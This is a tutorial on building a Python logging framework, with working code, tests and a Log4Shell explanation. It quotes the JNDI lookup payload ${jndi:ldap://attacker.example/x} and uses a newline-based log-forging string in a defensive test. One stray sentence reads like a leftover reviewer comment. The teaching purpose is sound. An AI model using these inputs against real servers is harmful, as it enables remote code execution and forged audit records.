At 2 a.m. a payment service starts timing out. The on-call engineer opens the logs and finds three problems. The last two minutes before each crash are missing, exactly the part that would explain it. Lines from hundreds of concurrent requests are interleaved with no way to tell which belong together. And, while investigating, a colleague notices the service had slowed down sharply at the start of the incident because every request thread was waiting for the log file to be written on a disk that was itself struggling. The logging, meant to help, had made the incident worse and hidden its cause.

A logging framework looks like the simplest component in a system, and it is one of the most heavily used: every request on every server calls it many times. It must cost almost nothing when a message is not wanted, never slow or crash the application when its destination misbehaves, attach the context that makes lines useful (which request, which user, which thread), produce output both people and machines can read, survive shutdown without losing the last records, and be safe against hostile input, because log messages routinely contain text that came from users.

That last point is not theoretical. In December 2021, Log4Shell (CVE-2021-44228) showed that Log4j 2, the most widely used Java logging library, would interpret certain patterns inside logged strings as lookups, including JNDI lookups that fetched and ran code from a remote server. Anyone who could get a string into a log, through a user name, a chat message or an HTTP header, could execute code on the server. It was rated 10.0, the maximum severity, and thousands of organisations spent weeks patching.

Logging is also where several earlier ideas meet. The level check before any work is the lazy-evaluation habit; the bounded queue that drops and counts is the overload discipline from the batching and resilient-client cases; the hierarchy with inherited settings is a tree with defaults; and context variables are the per-request state that every server eventually needs. A good answer reuses those ideas by name.

As a machine-coding round, the logging framework tests separation of concerns more cleanly than almost any other problem. There are three independent questions (should this be recorded, where should it go, how should it look), and each deserves its own abstraction. On top of that come a hierarchy of loggers, a performance requirement that shapes the API, and concurrency: a background writer with a bounded queue and an honest shutdown.

This lesson follows the round: clarify the requirements, find the abstractions, draw them, write a naive logger and list its failures, then build the framework in stages (levels and the cheap check, the logger hierarchy, handlers and formatters, context, structured output and injection, failure isolation, the async handler and shutdown), trace a record, test it, and cover edge cases, extensions such as sampling and rotation, complexity, Python's standard library design and the Log4Shell advisory.

Three independent questions

Every logging call raises three questions. Should this be recorded? That depends on its severity, its level (DEBUG, INFO, WARNING, ERROR, CRITICAL, conventionally numbered 10 to 50), and the threshold configured for the code that logged it, plus optional filters. Where should it go? To the console, a file, a network log collector, sometimes several at once, each perhaps with its own threshold: all INFO to the file, only ERROR to the pager. How should it look? A human-readable line for a developer's terminal, a JSON object for a machine. These vary independently, so they are three kinds of object: loggers decide whether, handlers decide where, formatters decide how. Python's logging module, Log4j and most other frameworks share this structure; Log4j calls handlers "appenders" and formatters "layouts".

The cheap check comes first

Production code contains thousands of debug calls on busy paths, turned off by configuration. The framework's first job is to make those calls nearly free: check the level before doing anything else, before creating a record, before formatting the message. Formatting is deferred: the call passes a template and arguments, log.debug("user %s did %s", uid, action), and the string is built only if some handler will actually write it. Python's documentation states the principle directly: formatting of message arguments is deferred until it cannot be avoided. The API matters here: an f-string, log.debug(f"user {uid}"), is formatted by Python at the call site before the logging function even runs, so the framework cannot save its cost.

A hierarchy of loggers

Loggers are named with dots, like Python modules: app, app.db, app.db.pool. The names form a tree with a root logger at the top. Two rules make the tree useful. A logger with no level of its own uses its nearest ancestor's, its effective level, so setting app.db to DEBUG turns on debugging for the database layer and nothing else. And a record, after going to its own logger's handlers, propagates up to its ancestors' handlers, so an application can attach handlers once, at the root, and receive records from every library. A library should therefore only create loggers and log; configuring handlers is the application's job.

Who reads logs

It helps to design for the actual readers. A developer reads a few lines in a terminal while debugging and wants them short and human. An on-call engineer searches millions of lines during an incident and wants to filter by request id, endpoint and error type in seconds. Automated systems count errors to fire alerts and compute dashboards. Security and compliance teams audit who did what. These readers want different formats and different subsets of the same events, which is exactly why handlers and formatters are separate and configurable rather than fixed in the code that logs.

The analogy, and where it breaks

Think of a newsroom. Reporters (loggers) file stories tagged with an importance level. Editors at each desk (the hierarchy) decide what gets through: the sports desk may pass everything, the front-page desk only major stories. Approved stories go to several outlets (handlers): the website, the print edition, a push notification, each laid out differently (formatters). The analogy breaks on speed and safety: a newsroom can afford to have a human read every story, while a logging framework handles millions of records a second, must never slow the reporters down, and must treat every story's text as potentially hostile.

The security point (never interpret message content) is a strong addition.

1 · Clarify the requirements

Ask which levels are needed and whether custom levels are allowed; whether different parts of the application need different levels; which destinations (console, file, network) and whether several at once; the output format (text for people, JSON for a log platform, or both); what context should appear on every line (request id, user id, thread); expected volume and the latency budget for a log call; what should happen if a destination is slow or down; whether logs must survive a crash; and whether the framework is used from threads, asyncio tasks or both.

A typical agreed scope: five levels; hierarchical loggers with inherited levels and propagation; console and file handlers, each with its own level and formatter; text and JSON formatters; request-scoped context fields; a log call must cost almost nothing when disabled and never block on I/O when enabled; destination failures must not affect the application; nothing already accepted may be lost on a clean shutdown; drops under overload are allowed but must be counted. Invariants: a record below a logger's effective level is never created; every accepted record is either written, or counted as dropped or failed.

2 · The abstractions

Record: an immutable value holding the logger name, level, template, arguments, timestamp, thread name, context fields and optional exception text; its message() method renders the template lazily. Logger: name, parent, optional level, list of handlers, propagate flag; computes its effective level, performs the cheap check, creates the record and walks up the hierarchy. Registry: creates loggers by name and links them to their parents, so get("app.db.pool") creates app and app.db if needed. Handler: level, filters, formatter, an error counter and a lock; subclasses implement write(line). Formatter: turns a record into a string. AsyncHandler: wraps another handler with a queue and a worker thread. bind: a context manager that adds fields to the current context.

3 · Stage one: a naive logger

class Logger:
    def __init__(self, path, level="INFO"):
        self.file = open(path, "a")
        self.level = level

    def log(self, level, message):
        line = f"{datetime.now()} {level} {message}"     # formatted before the check
        if LEVELS[level] >= LEVELS[self.level]:
            self.file.write(line + "\n")                  # synchronous I/O on the caller's thread
            self.file.flush()

Formatting happens before the level check, so every disabled debug call pays for building a string, and callers pass f-strings, which Python formats before the call. There is one destination and one format, so "text to the console and JSON to a file" means a second logger and duplicated calls. There is no hierarchy, so the database layer cannot be turned to DEBUG alone. Every call writes and flushes synchronously, so a slow disk slows every request. An exception from write (disk full) propagates into business code. Threads may interleave partial lines. Nothing carries a request id, so lines from concurrent requests cannot be grouped. And a message containing a newline produces what looks like two log lines.

4 · Stage two: levels and the cheap check

Levels are an IntEnum with the conventional values 10 to 50, so comparisons are integer comparisons. Logger.log starts with if not self.enabled_for(level): return, before creating any record or touching the arguments. To make expensive arguments cheap too, Record.message() calls any callable argument at render time, so log.debug("payload %s", build_payload) passes the function, not its result, and the function runs only if a handler actually formats the record. The test calls a disabled debug 10,000 times with such an argument and checks the function never ran; then enables DEBUG and checks it ran exactly once. The equivalent in Python's standard library is the documented if logger.isEnabledFor(logging.DEBUG): guard.

5 · Stage three: the hierarchy

Registry.get(name) returns the existing logger or creates one, first obtaining its parent by stripping the last dotted component (app.db.pool → app.db → app → root), so the tree is built on demand. effective_level walks up parents to the first with a level set; the root defaults to WARNING, as in Python. After the check, log creates the record and walks the same chain: each logger's handlers receive the record, and the walk continues to the parent unless the current logger's propagate is false. If no handler anywhere received a WARNING or worse, a last-resort handler gets it, mirroring Python's lastResort, so serious messages from an unconfigured application are not silently lost. The test sets app to INFO, attaches handlers at the root and at app.db, and checks that a DEBUG on app.db is dropped, an INFO reaches both handlers, and after propagate = False an ERROR reaches only app.db's handler.

6 · Stage four: handlers and formatters

Handler.handle(record) applies the handler's own level and filters, formats with its formatter, and writes under its own lock, so two threads never interleave half-lines on one destination. Handlers differ only in write: a list (for tests), a stream (console or file), or a network sink. Formatters differ only in format. TextFormatter produces a readable line with time, level, logger name, context fields and the message, plus the traceback if any. JsonFormatter produces one JSON object per record with each field separate. Any handler can use any formatter, which is the payoff of separating them.

7 · Stage five: context

A request id makes logs from concurrent requests readable, but passing it into every function that might log is impractical. A context variable (contextvars.ContextVar) holds a dict of fields that is separate for each thread and each asyncio task. with bind(request_id="r42"): sets the fields for the duration of the block and restores the previous value afterwards; log copies the current fields into every record. The test runs 20 threads, each binding its own request id and logging, and checks that every line carries exactly its own thread's id. Log4j calls the same mechanism the mapped diagnostic context, or MDC.

8 · Stage six: structured output and log injection

Log messages often contain user input. With a text formatter, a user name such as bob\n12:00:00 INFO auth: user=admin logged in produces what looks like two lines, the second a forged record that an investigator might believe. This is log injection, and the Apache Logging security page notes that unstructured pattern layouts do not protect against it. The JSON formatter does: json.dumps escapes the newline, so one call is always exactly one line, and the user input stays inside the msg field where it cannot impersonate another field. The test logs that exact string and checks the text output now spans two lines while the JSON output is one line that parses back to the original message. A stronger rule follows from Log4Shell: the formatter must never interpret anything inside a message or argument; templates come from code, values are only ever data.

9 · Stage seven: failure isolation

Writing can fail: a disk fills, a socket times out, a formatter meets an object whose __str__ raises. None of that may reach the application, whose operation succeeded and only wanted to record it. handle wraps formatting and writing in try and increments errors on any exception. The other handlers still run. The test attaches a handler whose write raises OSError("disk full") next to a working one, logs an error, and checks the application saw no exception, the broken handler counted one failure, and the working handler still wrote the line. In production the counters are exported as metrics, because a logging system that fails silently is how teams discover their logs stopped weeks ago.

10 · Stage eight: the async handler and shutdown

To keep slow destinations off the application's threads, AsyncHandler wraps any handler. Its handle does the level check and put_nowait on a bounded queue.Queue, and returns. If the queue is full it increments dropped and returns; it never waits. A single worker thread loops get() and passes each record to the wrapped handler. The worker is not a daemon, so the process does not exit with records stranded. close() stops intake, puts a None sentinel behind everything already queued, waits for the worker with a timeout, then closes the wrapped handler. The test floods 5,000 errors at a deliberately slow destination through a queue of 100: the caller's loop finished in tens of milliseconds, about 100 records were written, the rest were dropped and counted, and written plus dropped equals exactly 5,000. Nothing disappeared without a trace. Python's standard library offers the same structure as QueueHandler and QueueListener, and its cookbook recommends it for handlers that block.

12 · Testing a logging framework

Logging code is tested through observable behaviour. A list handler captures formatted lines so tests can assert on content and count. Level and propagation tests check which handlers received what. The laziness test counts calls to an expensive argument. The injection test checks line counts for a hostile message under both formatters. The context test runs threads concurrently and checks each line's request id. The failure test uses a handler that raises. The async test uses a deliberately slow handler and checks the accounting identity: written plus dropped equals calls made. These tests are short, deterministic apart from the async timing (which the identity makes robust), and each pins one requirement from the clarified list.

13 · Talking through the design

"Three concerns, three abstractions: loggers decide whether, handlers decide where, formatters decide how. Loggers form a dotted hierarchy with inherited levels and propagation, so libraries just log and the application configures handlers at the root. The level check happens before a record exists, and arguments render lazily, so disabled calls are nearly free. Context variables add request ids per thread or task. JSON output keeps one call on one line and user input in its own field, which defeats log injection, and nothing in a message is ever interpreted, the Log4Shell lesson. Handlers catch and count their own failures. Slow destinations sit behind an async handler with a bounded queue that drops and counts instead of blocking, and close drains everything accepted before shutdown."

14 · The full solution

The file below contains the framework and six tests. Python 3.12, standard library only; it does not use the logging module, so every mechanism is visible.

"""A small logging framework: hierarchical loggers with inherited levels and propagation,
lazy formatting, handlers x formatters, contextual fields via contextvars, failure isolation,
and an async handler with a bounded queue, drop counting and a draining close().
Python 3.12, standard library only. Run: python minilog.py"""
from __future__ import annotations

import contextvars
import json
import queue
import threading
import time
import traceback
from dataclasses import dataclass, field
from enum import IntEnum
from typing import Any, Callable, Protocol, TextIO


class Level(IntEnum):
    DEBUG = 10
    INFO = 20
    WARNING = 30
    ERROR = 40
    CRITICAL = 50


_context: contextvars.ContextVar[dict] = contextvars.ContextVar("log_context", default={})


class bind:
    """with bind(request_id="r1"): ... adds fields to every record in this thread/task."""

    def __init__(self, **fields: Any) -> None:
        self.fields = fields

    def __enter__(self):
        self.token = _context.set({**_context.get(), **self.fields})

    def __exit__(self, *exc):
        _context.reset(self.token)


@dataclass(frozen=True)
class Record:
    logger: str
    level: Level
    template: str
    args: tuple
    created: float
    thread: str
    context: dict = field(default_factory=dict)
    exc: str | None = None

    def message(self) -> str:
        """Render lazily: callables are invoked only now, i.e. only for enabled records."""
        args = tuple(a() if callable(a) else a for a in self.args)
        return self.template % args if args else self.template


# ------------------------------------------------------------------ formatters
class Formatter(Protocol):
    def format(self, r: Record) -> str: ...


class TextFormatter:
    def format(self, r: Record) -> str:
        ctx = "".join(f" {k}={v}" for k, v in sorted(r.context.items()))
        line = f"{time.strftime('%H:%M:%S', time.gmtime(r.created))} {r.level.name:<8} {r.logger}:{ctx} {r.message()}"
        return line + (f"\n{r.exc}" if r.exc else "")


class JsonFormatter:
    """One JSON object per line; json.dumps escapes newlines, so a message cannot forge lines."""

    def format(self, r: Record) -> str:
        doc = {"ts": round(r.created, 3), "level": r.level.name, "logger": r.logger,
               "thread": r.thread, "msg": r.message(), **r.context}
        if r.exc:
            doc["exc"] = r.exc
        return json.dumps(doc, default=str)


# ------------------------------------------------------------------ handlers
class Handler:
    def __init__(self, level: Level = Level.DEBUG, formatter: Formatter | None = None,
                 filters: list[Callable[[Record], bool]] | None = None) -> None:
        self.level, self.formatter = level, formatter or TextFormatter()
        self.filters = filters or []
        self.errors = 0
        self._lock = threading.Lock()

    def handle(self, r: Record) -> None:
        if r.level < self.level or not all(f(r) for f in self.filters):
            return
        try:
            line = self.formatter.format(r)
            with self._lock:                            # one writer at a time per destination
                self.write(line)
        except Exception:                               # logging must never break the caller
            self.errors += 1

    def write(self, line: str) -> None:
        raise NotImplementedError

    def close(self) -> None: ...


class ListHandler(Handler):
    def __init__(self, **kw) -> None:
        super().__init__(**kw)
        self.lines: list[str] = []

    def write(self, line: str) -> None:
        self.lines.append(line)


class StreamHandler(Handler):
    def __init__(self, stream: TextIO, **kw) -> None:
        super().__init__(**kw)
        self.stream = stream

    def write(self, line: str) -> None:
        self.stream.write(line + "\n")


class AsyncHandler(Handler):
    """Callers enqueue (never block); one worker thread writes to the wrapped handler.
    Full queue -> drop and count. close() stops intake, drains with a timeout, closes target."""

    def __init__(self, target: Handler, capacity: int = 10_000) -> None:
        super().__init__(level=target.level)
        self.target, self.q = target, queue.Queue(maxsize=capacity)
        self.dropped = 0
        self._closed = False
        self._worker = threading.Thread(target=self._run, name="log-writer")   # not a daemon
        self._worker.start()

    def handle(self, r: Record) -> None:
        if self._closed or r.level < self.level:
            return
        try:
            self.q.put_nowait(r)
        except queue.Full:
            self.dropped += 1                           # report this number; never block the app

    def _run(self) -> None:
        while True:
            r = self.q.get()
            if r is None:
                return
            self.target.handle(r)

    def close(self, timeout: float = 5.0) -> bool:
        self._closed = True
        self.q.put(None)                                # sentinel after everything already queued
        self._worker.join(timeout)
        self.target.close()
        return not self._worker.is_alive()


# ------------------------------------------------------------------ loggers
class Logger:
    def __init__(self, name: str, parent: "Logger | None") -> None:
        self.name, self.parent = name, parent
        self.level: Level | None = None                 # None: inherit from the parent
        self.handlers: list[Handler] = []
        self.propagate = True

    def effective_level(self) -> Level:
        node = self
        while node is not None:
            if node.level is not None:
                return node.level
            node = node.parent
        return Level.WARNING

    def enabled_for(self, level: Level) -> bool:
        return level >= self.effective_level()

    def log(self, level: Level, template: str, *args: Any, exc: bool = False) -> None:
        if not self.enabled_for(level):                 # cheap check FIRST: no record, no formatting
            return
        r = Record(self.name, level, template, args, time.time(), threading.current_thread().name,
                   dict(_context.get()), traceback.format_exc() if exc else None)
        node, handled = self, False
        while node is not None:                         # walk up the hierarchy
            for h in node.handlers:
                h.handle(r)
                handled = True
            if not node.propagate:
                break
            node = node.parent
        if not handled and level >= Level.WARNING:
            LAST_RESORT.handle(r)

    def debug(self, t, *a, **k): self.log(Level.DEBUG, t, *a, **k)
    def info(self, t, *a, **k): self.log(Level.INFO, t, *a, **k)
    def warning(self, t, *a, **k): self.log(Level.WARNING, t, *a, **k)
    def error(self, t, *a, **k): self.log(Level.ERROR, t, *a, **k)


class Registry:
    def __init__(self) -> None:
        self.root = Logger("root", None)
        self.root.level = Level.WARNING
        self._loggers: dict[str, Logger] = {"root": self.root}
        self._lock = threading.Lock()

    def get(self, name: str) -> Logger:
        with self._lock:
            if name in self._loggers:
                return self._loggers[name]
            parent_name = name.rpartition(".")[0]
        parent = self.get(parent_name) if parent_name else self.root
        with self._lock:
            return self._loggers.setdefault(name, Logger(name, parent))


LAST_RESORT = ListHandler(level=Level.WARNING)          # stands in for stderr in this file


# ---------------------------------------------------------------- tests
def test_levels_inherit_and_propagate() -> None:
    reg = Registry()
    root_out, db_out = ListHandler(), ListHandler()
    reg.root.handlers.append(root_out)
    db = reg.get("app.db")
    db.handlers.append(db_out)
    reg.get("app").level = Level.INFO
    db.debug("hidden")
    db.info("connected to %s", "primary")
    assert db.effective_level() is Level.INFO and len(db_out.lines) == 1 and len(root_out.lines) == 1
    db.propagate = False
    db.error("boom")
    assert len(db_out.lines) == 2 and len(root_out.lines) == 1


def test_disabled_calls_do_not_format() -> None:
    reg = Registry()
    calls = []

    def expensive() -> str:
        calls.append(1)
        return "x" * 1000
    log = reg.get("hot")
    log.handlers.append(ListHandler())
    for _ in range(10_000):
        log.debug("payload %s", expensive)              # pass the callable, not its result
    assert calls == []
    log.level = Level.DEBUG
    log.debug("payload %s", expensive)
    assert calls == [1]


def test_json_prevents_forged_lines_text_does_not() -> None:
    reg = Registry()
    text, js = ListHandler(), ListHandler(formatter=JsonFormatter())
    log = reg.get("auth")
    log.handlers += [text, js]
    evil = "bob\n12:00:00 INFO     auth: user=admin logged in"
    log.warning("failed login for %s", evil)
    assert len("\n".join(text.lines).splitlines()) == 2          # one call, two apparent lines
    assert len(js.lines) == 1 and "\n" not in js.lines[0]
    assert json.loads(js.lines[0])["msg"].endswith("logged in")


def test_context_is_per_thread() -> None:
    reg = Registry()
    out = ListHandler(formatter=JsonFormatter())
    log = reg.get("web")
    log.handlers.append(out)

    def request(rid: str) -> None:
        with bind(request_id=rid):
            log.warning("handling")
    ts = [threading.Thread(target=request, args=(f"r{i}",)) for i in range(20)]
    for t in ts: t.start()
    for t in ts: t.join()
    ids = sorted(json.loads(l)["request_id"] for l in out.lines)
    assert ids == sorted(f"r{i}" for i in range(20))


def test_broken_handler_never_raises_into_the_app() -> None:
    class Broken(Handler):
        def write(self, line: str) -> None:
            raise OSError("disk full")
    reg = Registry()
    b, ok = Broken(), ListHandler()
    reg.root.handlers += [b, ok]
    reg.get("x").error("still works")
    assert b.errors == 1 and ok.lines


def test_async_drops_when_full_and_drains_on_close() -> None:
    class Slow(ListHandler):
        def write(self, line: str) -> None:
            time.sleep(0.0005)
            super().write(line)
    target = Slow()
    a = AsyncHandler(target, capacity=100)
    reg = Registry()
    reg.root.handlers.append(a)
    log = reg.get("svc")
    t0 = time.perf_counter()
    for i in range(5_000):
        log.error("event %d", i)
    spent = time.perf_counter() - t0
    assert a.close() is True
    assert a.dropped > 0 and len(target.lines) + a.dropped == 5_000   # nothing silently lost
    print(f"    5,000 errors logged in {spent * 1000:.0f} ms of caller time; "
          f"{len(target.lines)} written, {a.dropped} dropped and counted")


if __name__ == "__main__":
    for t in (test_levels_inherit_and_propagate, test_disabled_calls_do_not_format,
              test_json_prevents_forged_lines_text_does_not, test_context_is_per_thread,
              test_broken_handler_never_raises_into_the_app, test_async_drops_when_full_and_drains_on_close):
        t()
        print("ok ", t.__name__)

15 · What not to log

A framework can enforce some hygiene, and an interviewer may ask what it should. Never log secrets: passwords, API keys, session tokens, full card numbers. Avoid personal data unless there is a reason and a retention policy, because logs are copied widely and kept long. Do not log whole request or response bodies by default; log identifiers and sizes. A redaction filter attached at the root can mask values whose keys look sensitive (password, token, authorization) and strings that match known secret formats, before any formatter sees them. It is a safety net, not a substitute for care at call sites, because no pattern catches everything. The same filter is a natural place to cap message length, so a mistaken attempt to log a megabyte payload costs a few hundred bytes instead.

16 · Edge cases

Arguments that do not match the template (log.info("%s %s", one)): the formatter raises inside handle, which counts it; a production framework would emit the template and arguments raw instead of losing the record. Logging inside a handler (a handler that logs its own errors through the same logger): infinite recursion; handlers must report internally, never through the framework. Logging during interpreter shutdown: destinations may already be closed; close handlers in reverse order of creation and tolerate failures. Very large messages (a megabyte payload): truncate in the formatter with a marker. Non-serialisable values in JSON: default=str converts them rather than failing. Clock: timestamps use wall-clock time (records are read by humans and correlated across machines), unlike deadlines, which use a monotonic clock.

17 · Extensions the interviewer will ask for

File rotation by size or time, with a cap on retained files. Sampling: keep all errors, a fraction of routine lines, chosen by hashing the request id so whole requests are kept together. Rate limiting identical messages: suppress repeats within a window and log a count. Configuration from a file or environment, reloadable at runtime to change levels without a restart. Network handlers with batching and retry, behind the async handler. Redaction filters that mask secrets and personal data before formatting. Trace correlation: put the distributed-trace id in the context so logs link to traces.

18 · Complexity

A disabled call costs one walk up the logger chain to the first explicit level, O(depth), typically two or three steps (cacheable per logger, invalidated when levels change). An enabled call costs O(depth) to propagate plus, per accepting handler, one format and either one write or one enqueue. The async handler's enqueue is O(1). Memory is bounded by the queue capacity. Context binding is O(fields) per bind. In practice the dominant costs are formatting and I/O, which is why the design moves both off the caller's thread or avoids them entirely for disabled calls; the bookkeeping around them is negligible by comparison.

Why the API shape decides performance

The framework can only skip work it controls. With log.debug("user %s did %s", uid, action), the arguments are references to existing objects (cheap) and the string is never built when DEBUG is off. With log.debug(f"user {uid} did {action}"), Python evaluates the f-string before calling debug, so the formatting cost is paid on every call, enabled or not, and no framework can recover it. With log.debug("data %s", compute_big_summary()), the expensive function runs before the call. That is why the API offers lazy forms (templates with arguments, callables, or an explicit enabled-check), why style guides and linters for Python flag f-strings in logging calls, and why the cheap level check must be the very first thing the framework does. In Java, the same logic led SLF4J and Log4j 2 to parameterised messages and lambda arguments.

Caching the effective level

Walking up the parent chain on every call is cheap but not free on hot paths. Python's logging caches each logger's enabled-for-level answers and clears the caches whenever any level changes, because changes are rare and checks are constant. The general pattern, cache derived values and invalidate on configuration change, is safe here because configuration changes are infrequent and globally visible; it would be unsafe for data that changes per request.

Ordering and the async trade-off

A single worker preserves the order in which records were enqueued, which across threads is close to, but not exactly, the order in which events happened: two threads can log in one order and enqueue in the other. Timestamps are taken when the record is created, on the caller's thread, so they reflect when the event happened rather than when it was written. Multiple workers would increase throughput but lose ordering within one destination. The bigger trade-off is durability: anything in the queue is lost if the process is killed abruptly (out of memory, a hard crash). Synchronous logging of fatal errors, or flushing the queue in a crash handler, narrows the window; nothing closes it completely except writing synchronously, which costs latency on every call.

What to do when the queue is full

There are three choices, and each fails differently. Blocking the caller keeps every record and makes the application's latency hostage to the log destination: under an incident, the service slows because it is logging about the incident. Dropping the newest record keeps the beginning of a burst, which usually contains the root cause, and is the solution's choice. Dropping the oldest keeps the most recent state. Some frameworks let you choose per handler, and some keep errors while dropping lower levels first. Whatever the policy, the count of dropped records must be reported, both as a metric and, when space returns, as a log line of its own, so readers know the log is incomplete.

Log4Shell, mechanically

Log4j 2 supported lookups: patterns such as ${env:HOME} or ${java:version} inside a log message or its parameters were replaced with values when the message was formatted. One lookup type used JNDI, which can fetch an object from a remote directory server over LDAP and, in the configuration of the time, load and execute its code. So a message containing ${jndi:ldap://attacker.example/x}, which an attacker could get logged through any user-controlled field, made the server contact the attacker and run their code. The Apache advisory for CVE-2021-44228 rates it 10.0 CRITICAL and states that the JNDI features used in configuration, log messages and parameters did not protect against attacker-controlled endpoints; version 2.15.0 was the first fix for Java 8, and an incomplete-fix follow-up, CVE-2021-45046, was fixed in 2.16.0. The design lesson is a rule for any framework that formats text: data from the message and arguments is inserted literally and never parsed for further substitution.

What each level should mean

Levels only help if a team agrees what they mean, ideally in operational terms. ERROR: an operation failed and someone may need to act, so errors are counted and can page. WARNING: something unexpected happened that the system handled, worth a look if it becomes frequent. INFO: significant normal events, such as startup, configuration, and one line per request or job. DEBUG: detail for diagnosing problems, normally off. The common failure is level inflation, where everything is logged at ERROR "to be safe", so real errors drown and alerts on error counts become noise. Another is logging an exception at every layer it passes through, producing five stack traces for one failure; log it once, where it is handled.

Structured logs as data

Once logs are JSON with consistent field names, they stop being text to search and become data to query: count errors by endpoint, find all lines for one request id, compute latency percentiles from a duration field. That changes what you log: fewer prose sentences, more fields (event="payment_failed" amount_cents=1999 reason="card_declined"). It also changes the cost model, since log platforms bill by volume, which is why sampling and choosing levels carefully matter as much as the framework's speed.

How logging fails in production

The failures cluster around the moments logs matter most. During incidents, error volume spikes, records grow (stack traces), and synchronous handlers or blocking queues slow request threads; the remedy is asynchronous handlers that drop and count, plus rate limiting of repeated errors. At crashes, queued records are lost with a daemon worker or a missing shutdown flush; the remedy is a non-daemon worker, a close in the shutdown path, and synchronous writes for fatal errors. Silently, a full disk or a broken collector stops logs entirely while the application runs on; the remedy is error and drop counters exported as metrics, with alerts when they rise.

Security failures form the second cluster: secrets and personal data written to logs (passwords in request bodies, tokens in headers, user emails), which then leak to everyone with log access; log injection that forges entries; and, as Log4Shell showed, vulnerabilities in the logging library itself. Redaction filters, structured output, and treating the logging library as security-critical code that must be patched quickly are the responses.

The third is cost. Log platforms charge by volume, and a single debug line left enabled on a hot path can multiply the bill. Teams set levels per logger, sample routine lines, and review the top log sources by volume regularly.

Retention, access and compliance

Logs are data with a lifecycle. Decide how long each kind is kept (debug detail for days, audit logs for years), who can read them, and how personal data in them is handled when a user asks for deletion. Many regulations treat logs containing personal data like any other personal data, which is another argument for keeping such data out of logs in the first place, or in separate, access-controlled streams. Audit logs (who did what, when) are a special case: they must be complete and tamper-evident, so they are often written synchronously to an append-only store rather than through a best-effort async pipeline that is allowed to drop.

What to measure

Records written, dropped and failed per handler; queue depth and the fraction of time the queue is full; time spent in logging calls on application threads (should be microseconds); log volume by logger name and level; and the delay from an event to its arrival in the log platform. A rising drop count during incidents is the signal to rethink levels or capacity before the next one.

Knobs

Levels per logger (changeable at runtime without restarts, so an engineer can turn on DEBUG for one module during an investigation), queue capacity and drop policy, formatter choice per handler, sampling rates, rotation size and retention, and redaction rules. Python's logging.config.dictConfig and Log4j's configuration files exist so these can change without code changes.

The real cases: Python's logging and Log4Shell

Python's standard library documents this lesson's design almost point for point. The logging HOWTO lists the levels in order of severity with WARNING as the default, so only warnings and above are tracked unless configured otherwise; it draws the flow a call follows (logger enabled for the level, filters, handlers of this logger, propagate to the parent if propagate is true, use the lastResort handler if no handler exists in the hierarchy, then each handler's own level and filters, then emit, which includes formatting); and its optimisation section states that formatting of message arguments is deferred until it cannot be avoided, recommending isEnabledFor() to guard expensive argument computation. The logging cookbook's section on handlers that block recommends exactly the async design here: attach only a QueueHandler on performance-critical threads, let a QueueListener on another thread do the slow work, and catch queue.Full if the queue is bounded. The counterpoint is Apache Log4j's security page: CVE-2021-44228, Log4Shell, CVSS 10.0, in which JNDI features in log messages and parameters let an attacker who controlled logged text load code from an LDAP server; the first fix for Java 8 was 2.15.0, completed by 2.16.0 for CVE-2021-45046. One document shows how a logging framework should be structured; the other shows what happens when it does one thing more than it should.

Goal: run the framework, then break, measure and extend it. Python 3.12, standard library only.

  1. Save the full solution as minilog.py and run it. Six tests print ok; the last prints how many of 5,000 flooded errors were written and how many were dropped and counted.
  2. Break it. Move the record creation in Logger.log above the level check and make Record render the message eagerly. The laziness test fails: the expensive argument now runs 10,000 times for disabled calls.
  3. Break it again. Make the async handler use put() (blocking) instead of put_nowait(). Time the flood loop: the caller now runs at the speed of the slow destination.
  4. Measure it. Time one million disabled debug calls with a template and argument, with an f-string, and with a callable argument. Compare with one million enabled calls to a list handler.
  5. Extend it. Add a RotatingFileHandler that starts a new file when the current one exceeds a size, keeping the last N files, and a redaction filter that masks anything matching a token pattern.
  6. Extend it again. Add sampling: a filter that keeps all records of level WARNING and above and 1 percent of others, chosen by a hash of the request id in the context.

For each change, re-check the accounting identity (written + dropped + failed = accepted) and the injection test; those are the two properties most often broken by "small" logging changes. Write a test for each new feature before trusting it on a real service, and run the whole suite after every change.

Work it out

A service handles 20,000 requests per second. Each request makes 8 log calls: 5 at DEBUG (disabled in production), 2 at INFO, and 1 at WARNING on 2 percent of requests. The async handler has a 10,000-record queue and its writer sustains 50,000 records per second. Then an incident causes an ERROR with a stack trace on every request.

(a) What is the normal log volume, and how does the queue behave? (b) What happens during the incident? (c) What do the disabled DEBUG calls cost with eager versus lazy formatting?

Answer

(a) Normal state. Enabled records per request: 2 INFO + 0.02 WARNING = 2.02. At 20,000 requests per second that is about 40,400 records per second against a writer capacity of 50,000: about 20 percent headroom, and the queue stays near empty. The headroom is thinner than it looks; a 25 percent traffic rise or a slower disk removes it.

(b) The incident. Every request now adds an ERROR: 3.02 records per request, about 60,400 per second, and the error records carry stack traces, so the writer, rated for small lines, manages fewer than 50,000. The queue fills at 10,000 or more records per second net and is full in about a second. From then on the full-queue policy decides everything. If it blocks, request threads wait on the writer, so request throughput falls to whatever the disk allows: the service slows down because it is logging about being unhealthy, which deepens the incident. If it drops and counts, requests continue at full speed and roughly a sixth of records (more with larger records) are dropped and reported. Dropping is the right default; better still, rate-limit the repeated error (log the first few with stack traces, then a count per interval), which cuts the volume back below capacity and keeps the first, most informative occurrences.

(c) Disabled DEBUG calls. 5 per request × 20,000 requests per second = 100,000 disabled calls per second. With lazy formatting each costs a level check, well under a microsecond: a negligible fraction of one core. With eager formatting (f-strings, or building the string before checking), each costs string formatting, often several microseconds, plus allocations: perhaps 0.2 to 0.5 seconds of CPU per second, a substantial part of a core spent producing strings that are immediately discarded, plus extra garbage-collection pressure. The framework can make the lazy form free; it cannot fix f-strings, so the API and the team's style rules must steer callers to the lazy form.
